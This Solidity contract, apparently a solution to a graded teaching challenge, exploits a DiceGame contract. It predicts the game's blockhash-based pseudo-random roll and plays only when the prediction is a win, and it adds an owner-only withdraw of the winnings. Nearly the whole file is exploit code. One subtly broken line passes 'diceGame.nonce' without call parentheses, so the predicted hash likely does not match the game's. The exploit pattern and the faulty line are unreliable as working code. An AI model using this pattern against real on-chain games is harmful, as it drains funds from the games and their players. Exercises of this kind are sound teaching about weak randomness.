pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negatively impacts submission grading
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    event Received(address indexed sender, uint256 amount);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Withdraw function to transfer Ether from the rigged contract to a specified address
    function withdraw(address payable to, uint256 amount) public onlyOwner {
        require(address(this).balance >= amount, "Insufficient balance");
        (bool sent, ) = to.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }

    // Function to predict the outcome and roll the dice only if it guarantees a win
    function riggedRoll() public payable {
        // Predicting the outcome of the roll
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bytes32 hash = keccak256(abi.encodePacked(blockValue, address(this), diceGame.nonce));
        uint256 diceRoll = uint256(hash) % 16;  // DiceGame uses a modulus of 16

        // Only roll the dice if the predicted roll is less than or equal to 5
        if (diceRoll <= 5) {
            // Initiating roll
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            revert("Not Winning. Roll again, please!");
        }
    }

    // Receive function to enable the contract to receive incoming Ether
    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
}